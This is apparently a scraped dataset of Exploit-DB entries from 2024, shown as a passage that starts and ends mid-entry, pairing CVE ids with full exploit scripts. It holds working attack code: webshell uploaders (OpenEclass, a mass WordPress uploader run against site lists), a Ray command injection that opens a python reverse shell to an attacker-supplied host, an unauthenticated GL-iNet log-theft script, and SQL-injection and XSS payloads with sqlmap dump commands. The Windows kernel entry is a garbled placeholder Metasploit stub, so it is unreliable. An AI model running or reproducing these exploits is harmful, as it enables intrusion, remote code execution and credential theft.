print(""新建 (New)"" + self.newaccesskey + "" accessKey 失败 (fail)！"") def deleteaccesskey(self): url = self.url + ""/api/v1/service-accounts/"" + base64.b64encode(self.newaccesskey.encode(""utf-8"")).decode('utf-8') statuscode = self.session.request(""DELETE"", url, headers=self.headers).statuscode print(statuscode) if statuscode == 204: print(""删除"" + self.newaccesskey + "" accessKey成功！"") statuscode = 0 else: print(""删除 (delete)"" + self.newaccesskey + "" accessKey 失败 (fail)！"") def headersgen(self,url,sha256,method): datetimes = datetime.datetime.utcnow() datetimestr = datetimes.strftime('%Y%m%dT%H%M%SZ') urls = urllib.parse.urlparse(url) headers = { 'X-Amz-Content-Sha256': sha256, 'X-Amz-Date': datetimestr, 'Host': urls.netloc, headers = signv4s3( method=method, url=urls, region='us-east-1', headers=headers, credentials=self.credits, contentsha256=sha256, date=datetimes, return headers def consolels(self): url = self.consoleurl + ""/"" sha256 = ""e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"" headers = self.headersgen(url,sha256,'GET') if self.verify: response = requests.get(url,headers=headers,verify=False) else: response = requests.get(url, headers=headers) DOMTree = parseString(response.text) collection = DOMTree.documentElement buckets = collection.getElementsByTagName(""Bucket"") bucketnames = [] for bucket in buckets: bucketnames.append(bucket.getElementsByTagName(""Name"")[0].childNodes[0].data) print('当前可查看的bucket有:\n' + str(bucketnames)) return bucketnames def consoleexp(self): url = self.consoleurl + ""/minio/admin/v3/update-service-account?accessKey="" + self.newaccesskey sha256 = ""0f87fd59dff29507f82e189d4f493206ea7f370d0ce97b9cc8c1b7a4e609ec95"" headers = self.headersgen(url, sha256, 'POST') hexstring = ""e1fd1c29bed167d5cf4986d3f224db2994b4942291dbd443399f249b84c79d9f00b9e0c0c7eed623a8621dee64713a3c8c63e9966ab62fcd982336"" content = bytes.fromhex(hexstring) if self.verify: response = requests.post(url,headers=headers,data=content,verify=False) else: response = requests.post(url,headers=headers,data=content) statuscode = response.statuscode if statuscode == 204: print(""提升"" + self.newaccesskey + "" 权限成功！"") statuscode = 0 else: print(""提升 (promote)"" + self.newaccesskey + "" 权限失败 (Permission failed)！"") if name == 'main': logo = "" | ( \ V / | /|| / / | || | / / | | / / | | / / | | / / print(logo) parser = argparse.ArgumentParser() parser.addargument(""-H"", ""--host"", required=True, help=""Host of the target. example: 127.0.0.1"") parser.addargument(""-a"", ""--accesskey"", required=True, help=""Minio AccessKey of the target. example: minioadmin"") parser.addargument(""-s"", ""--secretkey"", required=True, help=""Minio SecretKey of the target. example: minioadmin"") parser.addargument(""-c"", ""--consoleport"", required=True, help=""Minio console port of the target. example: 9000"") parser.addargument(""-p"", ""--port"", required=True, help=""Minio port of the target. example: 9090"") parser.addargument(""--https"", action='storetrue', help=""Is MinIO accessed through HTTPS."") args = parser.parseargs() CVE202424747(args.host,args.port,args.consoleport,args.accesskey,args.secretkey,args.https)"
CVE-2024-31777,"{""CVE-2024-31777"": 1}",2024-04-12,GUnet OpenEclass E-learning platform 3.15 - &#039;certbadge.php&#039; Unrestricted File Upload,https://www.exploit-db.com/exploits/51975,"Exploit Title: GUnet OpenEclass E-learning platform 3.15 - 'certbadge.php' Unrestricted File Upload Date: 2024-02-04 Exploit Author: Georgios Tsimpidas Vendor Homepage: <URL> Software Link: <URL> Version: 3.15 (2024) Tested on: Debian Kali (Apache/2.4.57, PHP 8.2.12, MySQL 15.1) CVE : CVE-2024-31777 GUnet OpenEclass <= 3.15 E-learning platform - Unrestricted File import requests import argparse import zipfile import os import sys RED = '\033[91m' GREEN = '\033[92m' YELLOW = '\033[93m' RESET = '\033[0m' ORANGE = '\033[38;5;208m' MALICIOUSPAYLOAD = ""\ "" def banner(): print(f'{RED} {YELLOW} = Author: Frey = {RESET}') def executecommand(openeclass, filename): while True: Prompt for user input with ""eclass"" cmd = input(f""{RED}[{YELLOW}eClass{RED}]~# {RESET}"") Check if the command is 'quit', then break the loop if cmd.lower() == ""quit"": print(f""{ORANGE}\nExiting.{RESET}"") cleanserver(openeclass) sys.exit() Construct the URL with the user-provided command url = f""{openeclass}/courses/userprogressdata/certtemplates/{filename}?cmd={cmd}"" Execute the GET request try: response = requests.get(url) Check if the request was successful if response.statuscode == 200: Print the response text print(f""{GREEN}{response.text}{RESET}"") except requests.exceptions.RequestException as e: Print any error that occurs during the request print(f""{RED}An error occurred: {e}{RESET}"") def uploadwebshell(openeclass, username, password): loginurl = f'{openeclass}/?loginpage=1' loginpageurl = f'{openeclass}/main/loginform.php?next=%2Fmain%2Fportfolio.php' Login credentials payload = { 'next': '/main/portfolio.php', 'uname': f'{username}', 'pass': f'{password}', 'submit': 'Enter' headers = { 'Referer': loginpageurl, Use a session to ensure cookies are handled correctly with requests.Session() as session: # (Optional) Initially visit the login page if needed to get a fresh session cookie or any other required tokens session.get(loginpageurl) Post the login credentials response = session.post(loginurl, headers=headers, data=payload) Create a zip file containing the malicious payload zipfilepath = 'maliciouspayload.zip' with zipfile.ZipFile(zipfilepath, 'w') as zipf: zipf.writestr('evil.php', MALICIOUSPAYLOAD.encode()) Upload the zip file url = f'{openeclass}/modules/admin/certbadge.php?action=addcert' files = { 'filename': ('evil.zip', open(zipfilepath, 'rb'), 'application/zip'), 'certhtmlfile': (None, ''), 'orientation': (None, 'L'), 'description': (None, ''), 'certid': (None, ''), 'submitcerttemplate': (None, '') response = session.post(url, files=files) Clean up the zip file os.remove(zipfilepath) Check if the upload was successful if response.statuscode == 200: print(f""{GREEN}Payload uploaded successfully!{RESET}"") return True else: print(f""{RED}Failed to upload payload. Exiting.{RESET}"") return False def cleanserver(openeclass): print(f""{ORANGE}Cleaning server.{RESET}"") Remove the uploaded files requests.get(f""{openeclass}/courses/userprogressdata/certtemplates/evil.php?cmd=rm%20evil.zip"") requests.get(f""{openeclass}/courses/userprogressdata/certtemplates/evil.php?cmd=rm%20evil.php"") print(f""{GREEN}Server cleaned successfully!{RESET}"") def main(): parser = argparse.ArgumentParser(description=""Open eClass – CVE-CVE-2024-31777: Unrestricted File Upload Leads to Remote Code Execution"") parser.addargument('-u', '--username', required=True, help=""Username for login"") parser.addargument('-p', '--password', required=True, help=""Password for login"") parser.addargument('-e', '--eclass', required=True, help=""Base URL of the Open eClass"") args = parser.parseargs() banner() Running the main login and execute command function if uploadwebshell(args.eclass, args.username, args.password): executecommand(args.eclass, 'evil.php') if name == ""main"": main()"
CVE-2023-6019,"{""CVE-2023-6019"": 1}",2024-04-12,Ray OS v2.6.3 - Command Injection RCE(Unauthorized),https://www.exploit-db.com/exploits/51978,"Exploit Title: Ray OS v2.6.3 - Command Injection RCE(Unauthorized) Description: The Ray Project dashboard contains a CPU profiling page, and the format parameter is not validated before being inserted into a system command executed in a shell, allowing for arbitrary command execution. If the system is configured to allow passwordless sudo # (a setup some Ray configurations require) this will result in a root shell being returned to the user. If not configured, a user level shell will be returned Version: <= 2.6.3 Date: 2024-4-10 Exploit Author: FireWolf Tested on: Ubuntu 20.04.6 LTS Vendor Homepage: <URL> Software Link: <URL> CVE: CVE-2023-6019 Refer: <URL> # !usr/bin/python3 coding=utf-8 import base64 import argparse import requests import urllib3 proxies = {""http"": ""127.0.0.1:8080""} headers = { ""User-Agent"": ""Mozilla/5.0 (X11; Linux x8664; rv:91.0) Gecko/20100101 Firefox/91.0"" def checkurl(target, port): targeturl = target + "":"" + port https = 0 if 'http' not in target: try: urllib3.disablewarnings(urllib3.exceptions.InsecureRequestWarning) testurl = ' <URL> + targeturl response = requests.get(url=testurl, headers=headers, verify=False, timeout=3) if response.statuscode != 200: ishttps = 0 return ishttps except Exception as e: print(""ERROR! The Exception is:"" + format(e)) if https == 1: return "" <URL> + targeturl else: return "" <URL> + targeturl def exp(target,ip,lhost, lport): payload = 'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AFINET,socket.SOCKSTREAM);s.connect((""' + lhost + '"",' + lport + '));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(""/bin/bash"")\'' print(""[*]Payload is: "" + payload) b64payload = base64.b64encode(payload.encode()) print(""[]Base64 encoding payload is: "" + b64_payload.decode()) exp_url = target + '/worker/cpu_profile?pid=3354&ip=' + str(ip) + '&duration=5&native=0&format=`echo ' + b64_payload.decode() + ' |base64$IFS-d|sudo%20sh`' response = requests.get(url=exp_url, headers=headers, verify=False, timeout=3, prxoy=proxiess) print(exp_url) urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) response = requests.get(url=exp_url, headers=headers, verify=False) if response.status_code == 200: print(""[-]ERROR: Exploit Failed,please check the payload."") else: print(""[+]Exploit is finished,please check your machine!"") if __name__ == '__main__': parser = argparse.ArgumentParser( description=' formatter_class=argparse.RawDescriptionHelpFormatter, parser.add_argument('-t', '--target', type=str, required=True, help='tart ip') parser.add_argument('-p', '--port', type=str, default=80, required=False, help='tart host port') parser.add_argument('-L', '--lhost', type=str, required=True, help='listening host ip') parser.add_argument('-P', '--lport', type=str, default=80, required=False, help='listening port') args = parser.parse_args() target = args.target ip = args.target port = args.port lhost = args.lhost lport = args.lport targeturl = check_url(args.target, args.port) print(targeturl) print(""[] Checking in url: "" + targeturl) exp(targeturl, ip, args.lhost, args.lport)"
CVE-2024-21338,"{""CVE-2024-21338"": 1}",2024-04-02,Microsoft Windows 10.0.17763.5458 - Kernel Privilege Escalation,https://www.exploit-db.com/exploits/51946,"Exploit Title : Microsoft Windows 10.0.17763.5458 - Kernel Privilege Escalation Exploit Author: E1 Coders CVE: CVE-2024-21338 require 'msf/core' class MetasploitModule < Msf::Exploit::Remote Rank = NormalRanking include Msf::Exploit::Remote::DCERPC include Msf::Exploit::Remote::DCERPC::MS08067::Artifact def initialize(info = {}) super( updateinfo( info, 'Name' => 'CVE-2024-21338 Exploit', 'Description' => 'This module exploits a vulnerability in FooBar version 1.0. It may lead to remote code execution.', 'Author' => 'You', 'License' => MSFLICENSE, 'References' => [ ['CVE', '2024-21338'] registeroptions( OptString.new('RHOST', [true, 'The target address', '127.0.0.1']), OptPort.new('RPORT', [true, 'The target port', 1234]) end def check connect begin impacketartifact(dcerpcbinding('ncacniptcp'), 'FooBar') rescue Rex::Post::Meterpreter::RequestError return Exploit::CheckCode::Safe end Exploit::CheckCode::Appears end def exploit connect begin impacketartifact( dcerpcbinding('ncacniptcp'), 'FooBar', datastore['FooBarPayload'] rescue Rex::Post::Meterpreter::RequestError failwith Failure::UnexpectedReply, 'Unexpected response from impacketartifact' end handler disconnect end end refrence : <URL>"
CVE-2024-27356,"{""CVE-2024-27356"": 1}",2024-04-02,GL-iNet MT6000 4.5.5 - Arbitrary File Download,https://www.exploit-db.com/exploits/51942,"Exploit Title: GL-iNet MT6000 4.5.5 - Arbitrary File Download CVE: CVE-2024-27356 Google Dork: intitle:""GL.iNet Admin Panel"" Date: 2/26/2024 Exploit Author: Bandar Alharbi (aggressor) Vendor Homepage: <URL> Tested Software Link: <URL> Tested Model: GL-X3000 Spitz AX Affected Products and Firmware Versions: <URL> import sys import requests import json requests.packages.urllib3.disablewarnings() h = {'Content-type':'application/json;charset=utf-8', 'User-Agent':'Mozilla/5.0 (compatible;contxbot/1.0)'} def DoesTarExist(): r = requests.get(url+""/js/logread.tar"", verify=False, timeout=30, headers=h) if r.statuscode == 200: f = open(""logread.tar"", ""wb"") f.write(r.content) f.close() print(""[] Full logs archive `logread.tar` has been downloaded!"") print(""[] Do NOT forget to untar it and grep it! It leaks confidential info such as credentials, registered Device ID and a lot more!"") return True else: print(""[] The `logread.tar` archive does not exist however . try again later!"") return False def isVulnerable(): r1 = requests.post(url+""/rpc"", verify=False, timeout=30, headers=h) if r1.status_code == 500 and ""nginx"" in r1.text: r2 = requests.get(url+""/views/gl-sdk4-ui-login.common.js"", verify=False, timeout=30, headers=h) if ""Admin-Token"" in r2.text: j = {""jsonrpc"":""2.0"",""id"":1,""method"":""call"",""params"":["""",""ui"",""check_initialized""]} r3 = requests.post(url+""/rpc"", verify=False, json=j, timeout=30, headers=h) ver = r3.json()['result']['firmware_version'] model = r3.json()['result']['model'] if ver.startswith(('4.')): print(""[] Firmware version (%s) is vulnerable!"" %ver) print(""[] Device model is: %s"" %model) return True print(""[] Either the firmware version is not vulnerable or the target may not be a GL.iNet device!"") return False def isAlive(): try: r = requests.get(url, verify=False, timeout=30, headers=h) if r.statuscode != 200: print(""[*] Make sure the target's web interface is accessible!"") return False elif r.statuscode == 200: print(""[] The target is reachable!"") return True except Exception: print(""[] Error occurred when connecting to the target!"") pass return False if name == 'main': if len(sys.argv) != 2: print(""exploit.py url"") sys.exit(0) url = sys.argv[1] url = url.lower() if not url.startswith((' <URL> ' <URL> print(""[] Invalid url format! It should be http[s]:// "") sys.exit(0) if url.endswith(""/""): url = url.rstrip(""/"") print(""[] GL.iNet Unauthenticated Full Logs Downloader"") try: if (isAlive() and isVulnerable()) == (True and True): DoesTarExist() except KeyboardInterrupt: print(""[*] The exploit has been stopped by the user!"") sys.exit(0)"
CVE-2024-29410,"{""CVE-2024-29410"": 1}",2024-04-02,Petrol Pump Management Software v1.0 - Remote Code Execution (RCE),https://www.exploit-db.com/exploits/51943,Exploit Title: Petrol Pump Management Software v1.0 - Remote Code Execution (RCE) Date: 02/04/2024 Exploit Author: Sandeep Vishwakarma Vendor Homepage: <URL> Software Link: <URL> Version: v1.0 Tested on: Windows 10 CVE: CVE-2024-29410 Description: File Upload vulnerability in Petrol Pump Management Software v.1.0 allows an attacker to execute arbitrary code via a crafted payload to the logo Photos parameter in the web_crud.php component.
CVE-2024-24499,"{""CVE-2024-24499"": 1}",2024-04-02,Employee Management System 1.0 - `txtfullname` and `txtphone` SQL Injection,https://www.exploit-db.com/exploits/51950,"Exploit Title: Employee Management System 1.0 - txtfullname and txtphone SQL Injection Date: 2 Feb 2024 Exploit Author: Yevhenii Butenko Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Debian CVE : CVE-2024-24499 SQL Injection: > SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or ""injection"" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system. Affected Components: > /employeeakpoly/Admin/editprofile.php > Two parameters txtfullname and txtphone within admin edit profile mechanism are vulnerable to SQL Injection. ![txtfullname]( <URL> ![txtphone]( <URL> Description: > The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests. #Proof of Concept: SQLMap Save the following request to edit_profile.txt: POST /employeeakpoly/Admin/editprofile.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 88 Origin: <URL> Connection: close Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 txtfullname=Caroline+Bassey&txtphone=0905656&oldimage=uploadImage%2Fbird.jpg&btnupdate= Use sqlmap with -r option to exploit the vulnerability: sqlmap -r edit_profile.txt --level 5 --risk 3 --batch --dbms MYSQL --dump #Recommendations When using this Employee Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24497,"{""CVE-2024-24497"": 1}",2024-04-02,Employee Management System 1.0 - `txtusername` and `txtpassword` SQL Injection (Admin Login),https://www.exploit-db.com/exploits/51951,"Exploit Title: Employee Management System 1.0 - txtusername and txtpassword SQL Injection (Admin Login) Date: 2 Feb 2024 Exploit Author: Yevhenii Butenko Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Debian CVE : CVE-2024-24497 SQL Injection: > SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or ""injection"" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system. Affected Components: > /employeeakpoly/Admin/login.php > Two parameters `txtusername` and `txtpassword` within admin login mechanism are vulnerable to SQL Injection. ![txtusername]( <URL> ![txtpassword]( <URL> Description: > The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests. #Proof of Concept: Manual Exploitation The payload `' and 1=1-- -` can be used to bypass authentication within admin login page. POST /employeeakpoly/Admin/login.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 61 Origin: <URL> Connection: close Referer: <URL> Cookie: PHPSESSID=lcb84k6drd2tepn90ehe7p9n20 Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 txtusername=admin' and 1=1-- -&txtpassword=password&btnlogin= SQLMap Save the following request to admin_login.txt: POST /employeeakpoly/Admin/login.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 62 Origin: <URL> Connection: close Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 txtusername=admin&txtpassword=password&btnlogin= Use `sqlmap` with `-r` option to exploit the vulnerability: sqlmap -r adminlogin.txt --level 5 --risk 3 --batch --dbms MYSQL --dump #Recommendations When using this Employee Management System, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24494,"{""CVE-2024-24494"": 1}",2024-04-02,Daily Habit Tracker 1.0 - Stored Cross-Site Scripting (XSS),https://www.exploit-db.com/exploits/51952,"Exploit Title: Daily Habit Tracker 1.0 - Stored Cross-Site Scripting (XSS) Date: 2 Feb 2024 Exploit Author: Yevhenii Butenko Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Debian CVE : CVE-2024-24494 Stored Cross-Site Scripting (XSS): > Stored Cross-Site Scripting (XSS) is a web security vulnerability where an attacker injects malicious scripts into a web application's database. The malicious script is saved on the server and later rendered in other users' browsers. When other users access the affected page, the stored script executes, potentially stealing data or compromising user security. Affected Components: > add-tracker.php, update-tracker.php Vulnerable parameters: - day - exercise - pray - readbook - vitamins - laundry - alcohol - meat Description: > Multiple parameters within `Add Tracker` and `Update Tracker` requests are vulnerable to Stored Cross-Site Scripting. The application failed to sanitize user input while storing it to the database and reflecting back on the page. #Proof of Concept: The following payload ` ` can be used in order to exploit the vulnerability. Below is an example of a request demonstrating how a malicious payload can be stored within the `day` value: POST /habit-tracker/endpoint/add-tracker.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 175 Origin: <URL> DNT: 1 Connection: close Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 date=1992-01-12&day=Tuesday%3Cscript%3Ealert%28%27STOREDXSS%27%29%3C%2Fscript%3E&exercise=Yes&pray=Yes&readbook=Yes&vitamins=Yes&laundry=Yes&alcohol=Yes&meat=Yes ![XSS Fired]( <URL> #Recommendations When using this tracking system, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24495,"{""CVE-2024-24495"": 1}",2024-04-02,Daily Habit Tracker 1.0 - SQL Injection,https://www.exploit-db.com/exploits/51953,"Exploit Title: Daily Habit Tracker 1.0 - SQL Injection Date: 2 Feb 2024 Exploit Author: Yevhenii Butenko Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Debian CVE : CVE-2024-24495 SQL Injection: > SQL injection is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. Usually, it involves the insertion or ""injection"" of a SQL query via the input data from the client to the application. A successful SQL injection exploit can read sensitive data from the database, modify database data (Insert/Update/Delete), execute administration operations on the database (such as shutdown the DBMS), recover the content of a given file present on the DBMS file system, and in some cases, issue commands to the operating system. Affected Components: > delete-tracker.php Description: > The presence of SQL Injection in the application enables attackers to issue direct queries to the database through specially crafted requests. #Proof of Concept: Manual Exploitation The payload ';SELECT SLEEP(5)can be employed to force the database to sleep for 5 seconds: GET /habit-tracker/endpoint/delete-tracker.php?tracker=5'%3bSELECT+SLEEP(5)%23 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 ![5 seconds delay]( <URL> SQLMap Save the following request to `deletetracker.txt: GET /habit-tracker/endpoint/delete-tracker.php?tracker=5 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connection: close Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: none Sec-Fetch-User: ?1 Use sqlmap with -r` option to exploit the vulnerability: sqlmap -r ./delete_tracker.txt --level 5 --risk 3 --batch --technique=T --dump #Recommendations When using this tracking system, it is essential to update the application code to ensure user input sanitization and proper restrictions for special characters."
CVE-2024-24496,"{""CVE-2024-24496"": 1}",2024-04-02,Daily Habit Tracker 1.0 - Broken Access Control,https://www.exploit-db.com/exploits/51954,"Exploit Title: Daily Habit Tracker 1.0 - Broken Access Control Date: 2 Feb 2024 Exploit Author: Yevhenii Butenko Vendor Homepage: <URL> Software Link: <URL> Version: 1.0 Tested on: Debian CVE : CVE-2024-24496 Broken Access Control: > Broken Access Control is a security vulnerability arising when a web application inadequately restricts user access to specific resources and functions. It involves ensuring users are authorized only for the resources and functionalities intended for them. Affected Components: > home.php, add-tracker.php, delete-tracker.php, update-tracker.php Description: > Broken access control enables unauthenticated attackers to access the home page and to create, update, or delete trackers without providing credentials. #Proof of Concept: Unauthenticated Access to Home page > To bypass authentication, navigate to ' <URL> The application does not verify whether the user is authenticated or authorized to access this page. Create Tracker as Unauthenticated User To create a tracker, use the following request: POST /habit-tracker/endpoint/add-tracker.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 108 Origin: <URL> DNT: 1 Connection: close Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 date=1443-01-02&day=Monday&exercise=Yes&pray=Yes&readbook=Yes&vitamins=Yes&laundry=Yes&alcohol=Yes&meat=Yes Update Tracker as Unauthenticated User To update a tracker, use the following request: POST /habit-tracker/endpoint/update-tracker.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x8664; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 121 Origin: <URL> DNT: 1 Connection: close Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 tbltrackerid=5&date=1443-01-02&day=Monday&exercise=No&pray=Yes&readbook=No&vitamins=Yes&laundry=No&alcohol=No&meat=Yes Delete Tracker as Unauthenticated User: To delete a tracker, use the following request: GET /habit-tracker/endpoint/delete-tracker.php?tracker=5 HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br DNT: 1 Connection: close Referer: <URL> Upgrade-Insecure-Requests: 1 Sec-Fetch-Dest: document Sec-Fetch-Mode: navigate Sec-Fetch-Site: same-origin Sec-Fetch-User: ?1 #Recommendations When using this tracking system, it is essential to update the application code to ensure that proper access controls are in place."
CVE-2022-4395,"{""CVE-2022-4395"": 1}",2024-04-02,Wordpress Plugin - Membership For WooCommerce &lt; v2.1.7 - Arbitrary File Upload to Shell (Unauthenticated),https://www.exploit-db.com/exploits/51959,"Exploit Title: Wordpress Plugin - Membership For WooCommerce < v2.1.7 - Arbitrary File Upload to Shell (Unauthenticated) Date: 2024-02-25 Author: Milad Karimi (Ex3ptionaL) Category : webapps Tested on: windows 10 , firefox import sys , requests, re , json from multiprocessing.dummy import Pool from colorama import Fore from colorama import init init(autoreset=True) headers = {'Connection': 'keep-alive', 'Cache-Control': 'max-age=0', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8', 'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8', 'referer': ' <URL> uploader = "" GIF89a Resultz Uploader Uploaded "" requests.urllib3.disablewarnings() def Exploit(Domain): try: if 'http' in Domain: Domain = Domain else: Domain = ' <URL> myup = {'': ('db.php', uploader)} req = requests.post(Domain + '/wp-admin/admin-ajax.php?action=wpsmembershipcsvfile_upload', files=myup, headers=headers,verify=False, timeout=10).text req1 = requests.get(Domain + '/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php') if 'Ex3ptionaL' in req1: print (fg+'[+] '+ Domain + ' --> Shell Uploaded') open('Shellz.txt', 'a').write(Domain + '/wp-content/uploads/mfw-activity-logger/csv-uploads/db.php' + '\n') else: print (fr+'[+] '+ Domain + '{}{} --> Not Vulnerability') except: print(fr+' -| ' + Domain + ' --> {} [Failed]') target = open(input(fm+""Site List: ""), ""r"").read().splitlines() mp = Pool(int(input(fm+""Threads: "") mp.map(Exploit, target) mp.close() mp.join()"
CVE-2023-34927,"{""CVE-2023-34927"": 1}",2024-04-02,Casdoor &lt; v1.331.0 - &#039;/api/set-password&#039; CSRF,https://www.exploit-db.com/exploits/51961,"Exploit Title: Casdoor < v1.331.0 - '/api/set-password' CSRF Application: Casdoor Version: <= 1.331.0 Date: 03/07/2024 Exploit Author: Van Lam Nguyen Vendor Homepage: <URL> Software Link: <URL> Tested on: Windows CVE : CVE-2023-34927 Overview Casdoor v1.331.0 and below was discovered to contain a Cross-Site Request Forgery (CSRF) in the endpoint /api/set-password. This vulnerability allows attackers to arbitrarily change the victim user's password via supplying a crafted URL. Proof of Concept Made an unauthorized request to /api/set-password that bypassed the old password entry authentication step If a user is logged into the Casdoor Webapp at time of execution, a new user will be created in the app with the following credentials userOwner: built-in userName: admin newPassword: hacked"
CVE-2024-24724,"{""CVE-2024-24724"": 1}",2024-04-02,Gibbon LMS v26.0.00 - SSTI vulnerability,https://www.exploit-db.com/exploits/51962,"Exploit Title: Gibbon LMS v26.0.00 - SSTI vulnerability Date: 21.01.2024 Exploit Author: SecondX.io Research Team(Islam Rzayev,Fikrat Guliev, Ali Maharramli) Vendor Homepage: <URL> Software Link: <URL> Version: v26.0.00 Tested on: Ubuntu 22.0 CVE : CVE-2024-24724 import requests import re import sys def login(targethost, targetport,email,password): url = f' <URL> headers = {""Content-Type"": ""multipart/form-data; boundary=-174475955731268836341556039466""} data = f""-174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""address\""\r\n\r\n\r\n-174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""method\""\r\n\r\ndefault\r\n-174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""username\""\r\n\r\n{email}\r\n-174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""password\""\r\n\r\n{password}\r\n-174475955731268836341556039466\r\nContent-Disposition: form-data; name=\""gibbonSchoolYearID\""\r\n\r\n025\r\n-174475955731268836341556039466\r\nContent-Disposition: form-data; 